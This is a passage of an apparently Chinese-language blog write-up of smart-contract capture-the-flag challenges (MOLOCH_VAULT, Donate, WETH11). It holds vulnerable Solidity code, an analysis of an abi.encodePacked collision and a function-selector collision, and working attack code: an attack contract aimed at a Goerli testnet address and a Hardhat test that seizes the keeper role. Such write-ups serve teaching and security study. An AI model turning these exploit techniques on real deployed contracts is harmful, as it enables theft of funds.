class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">&#123;</span>value<span class=\"token punctuation\">:</span> <span class=\"token number\">1</span> wei<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>success<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint</span> YHUiiFD <span class=\"token operator\">=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>YHUiiFD <span class=\"token operator\">-</span> RGDTjhU <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"sacrifice your shallow desires\"</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        realHacker<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span> <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> molochPass<span class=\"token punctuation\">,</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span> _b<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span> a<span class=\"token punctuation\">,</span> <span class=\"token builtin\">string</span><span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span> _passss<span class=\"token punctuation\">)</span><span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">/*\n        Intelligence. Perhaps Irrelevant;\n        All value in string _passss were moloch-encrypted before input as added sec.\n        string molochPass is Moloch-hash-algorithm preimage to 3rd value passed in string[3] _passss.\n        Moloch-encryption algorithm was used to tweet\n        \"THE FUTURE OF HUMANITY REQUIRES THE SACRIFICE YOUR SHALLOW DESIRES\" \n        On 11/02/2023 via @Kodak_Rome\n        Link: \"https://twitter.com/Kodak_Rome/status/1624372583310262279\"\n        */</span>  \n\n        Moloch <span class=\"token operator\">=</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        hsah <span class=\"token operator\">=</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>molochPass<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n        question<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> _b<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> question<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> _b<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        hy7UIH <span class=\"token operator\">=</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span>question<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>question<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> a<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    \n            Cabal <span class=\"token keyword\">memory</span> aMember <span class=\"token operator\">=</span> <span class=\"token function\">Cabal</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span>password<span class=\"token punctuation\">:</span> _passss<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                                 identity<span class=\"token punctuation\">:</span> a<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            cabals<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>aMember<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Analyse-2\"><a href=\"#Analyse-2\" class=\"headerlink\" title=\"Analyse\"></a>Analyse</h2><p><strong>Georli Link:</strong> <a href=\"https://goerli.etherscan.io/address/0xafb9ed5cd677a1bd5725ca5fcb9a3a0572d94f6f\">0xafb9ed5cd677a1bd5725ca5fcb9a3a0572d94f6f</a></p>\n<p>在etherscan是可以看到合约构造参数编码的</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">0x00000000000000000000000000000000000000000000000000000000000000c000000000000000000000000000000000000000000000000000000000000001000000000000000000000000005b38da6a701c568545dcfcb03fcb875f56beddc4000000000000000000000000ab8483f64d9c6d1ecf9b849ae677dd3315835cb20000000000000000000000004b20993bc481177ec7e8f571cecae8a9e22c02db00000000000000000000000000000000000000000000000000000000000001c00000000000000000000000000000000000000000000000000000000000000011424c4f4f445920504841524d414349535400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000a57484f20444f20594f5500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000653455256453f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000e000000000000000000000000000000000000000000000000000000000000000054b434c45510000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000009424754474a514e4750000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000115a4a515142572a4e4643504b43414b5152000000000000000000000000000000<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>在solidity写一个decode拆分一下参数</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/image-20230322222613385.png\"></p>\n<p>对应的参数分别是uhER778中require的参数，所以在攻击参数中设置一样的参数即可，但是注意到<code>require(keccak256(abi.encode(_openSecrete[1])) != keccak256(abi.encode(question[0])),&quot;grant awarded!!&quot;);</code>一行代码，_openSecrete[1]和question[0]不能相等，但是如若不相等<code>require(hy7UIH == keccak256(abi.encodePacked(_openSecrete[1],_openSecrete[2])), &quot;Hahahaha!!&quot;);</code>就不会通过，仔细看发现使用了encodePacked也就是紧打包，举个例子来说就是abi.encodePacked(“abc”,”def”)&#x3D;&#x3D;abi.encodePacked(“ab”,”cdef”)，所以将后两个参数适当拆分就可以了<br>最终数组</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">[&quot;BLOODY PHARMACIST&quot;,&quot;WHO DO YO&quot;,&quot;USERVE?&quot;];<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h2 id=\"Attack-1\"><a href=\"#Attack-1\" class=\"headerlink\" title=\"Attack\"></a>Attack</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">attack</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">&#123;</span>   <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">pwn</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">string</span><span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span> array <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"BLOODY PHARMACIST\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"WHO DO YO\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"USERVE?\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        MOLOCH_VAULT  target <span class=\"token operator\">=</span> <span class=\"token function\">MOLOCH_VAULT</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">payable</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xaFB9ed5cD677a1bD5725Ca5FcB9a3a0572D94f6f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        target<span class=\"token punctuation\">.</span><span class=\"token function\">uhER778</span><span class=\"token punctuation\">(</span>array<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        target<span class=\"token punctuation\">.</span><span class=\"token function\">sendGrant</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">payable</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        target<span class=\"token punctuation\">.</span><span class=\"token function\">sendGrant</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">payable</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token function\">receive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">payable</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">&#123;</span>value<span class=\"token punctuation\">:</span><span class=\"token number\">2</span> wei<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/image-20230322222527265.png\"></p>\n<h1 id=\"0x0D-Donate\"><a href=\"#0x0D-Donate\" class=\"headerlink\" title=\"0x0D Donate\"></a>0x0D Donate</h1><h2 id=\"Code-2\"><a href=\"#Code-2\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token number\">0.8</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Donate</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">event</span> <span class=\"token function\">t1</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span> _sig<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> <span class=\"token keyword\">public</span> keeper<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> owner<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">event</span> <span class=\"token function\">newDonate</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">modifier</span> <span class=\"token function\">onlyOwner</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> owner <span class=\"token operator\">||</span> msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"You are not Owner\"</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _keeper<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        keeper <span class=\"token operator\">=</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">(</span>_keeper<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">pay</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n        keeper<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">newDonate</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">changeKeeper</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _newKeeper<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> onlyOwner <span class=\"token punctuation\">&#123;</span>\n        keeper <span class=\"token operator\">=</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">(</span>_newKeeper<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">secretFunction</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> f<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span>\n                <span class=\"token number\">0x097798381ee91bee7e3420f37298fe723a9eedeade5440d4b2b5ca3192da2428</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"invalid\"</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> success<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span>\n            abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>success<span class=\"token punctuation\">,</span> <span class=\"token string\">\"call fail\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">keeperCheck</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> keeper<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Analyes\"><a href=\"#Analyes\" class=\"headerlink\" title=\"Analyes\"></a>Analyes</h2><p>call调用可以绕过onlyOwner条件，使用合约本身调用<code>secretFunction</code>函数来修改keeper,但是<code>secretFunction</code>函数限制了特定函数的调用,但是函数选择器只取前四个字节,所以有冲突的风险.</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/image-20230302083359265.png\"></p>\n<h2 id=\"Attack-2\"><a href=\"#Attack-2\" class=\"headerlink\" title=\"Attack\"></a>Attack</h2><pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token function\">describe</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Donate\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">async</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">let</span> owner<span class=\"token punctuation\">,</span>attacker<span class=\"token punctuation\">,</span>keeper<span class=\"token punctuation\">;</span>\n    <span class=\"token function\">before</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">async</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token punctuation\">[</span>owner<span class=\"token punctuation\">,</span> attacker<span class=\"token punctuation\">,</span>keeper<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getSigners</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">const</span> Contract <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Donate\"</span><span class=\"token punctuation\">,</span>owner<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        contract <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> Contract<span class=\"token punctuation\">.</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span>keeper<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">it</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"success\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">async</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// start hack</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">keeper</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">secretFunction</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"refundETHAll(address)\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">keeper</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// end</span>\n        <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">keeperCheck</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span><span class=\"token function\">eq</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/image-20230302083549567.png\"></p>\n<h1 id=\"0x0C-WETH11\"><a href=\"#0x0C-WETH11\" class=\"headerlink\" title=\"0x0C WETH11\"></a>0x0C WETH11</h1><h2 id=\"Code-3\"><a href=\"#Code-3\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">&#123;</span>ERC20<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"@openzeppelin/contracts/token/ERC20/ERC20.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">&#123;</span>ReentrancyGuard<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"@openzeppelin/contracts/security/ReentrancyGuard.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">&#123;</span>Address<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"@openzeppelin/contracts/utils/Address.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// The Angel Di Maria Wrapped Ether</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">WETH11</span> <span class=\"token keyword\">is</span> <span class=\"token function\">ERC20</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Angel Di Maria Wrapped Ether\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"WETH11\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> ReentrancyGuard <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">receive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">deposit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_burnAll</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">_burn</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> <span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">deposit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> nonReentrant <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">_mint</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> wad<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> nonReentrant <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">_burn</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> wad<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        Address<span class=\"token punctuation\">.</span><span class=\"token function\">sendValue</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">payable</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> wad<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       \n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">withdrawAll</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> nonReentrant <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint256</span> balance <span class=\"token operator\">=</span> <span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">_burnAll</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        Address<span class=\"token punctuation\">.</span><span class=\"token function\">sendValue</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">payable</span><span class=\"token 